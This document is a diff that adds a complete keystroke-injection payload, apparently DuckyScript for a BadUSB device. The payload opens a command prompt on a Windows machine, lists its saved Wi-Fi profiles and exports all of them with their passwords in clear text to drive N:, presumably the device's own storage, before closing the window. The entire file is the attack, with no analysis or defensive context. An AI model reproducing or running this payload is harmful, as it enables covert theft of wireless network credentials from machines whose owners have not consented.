@@ -1,0 +1,15 @@
+DELAY 3000
+Ctrl w
+DELAY 2000
+GUI r
+STRING cmd
+ENTER
+DELAY 2000
+STRING netsh wlan show profile
+ENTER
+DELAY 2000
+STRING netsh wlan export profile folder=N:\ key=clear
+ENTER
+DELAY 2500
+STRING exit
+ENTER 
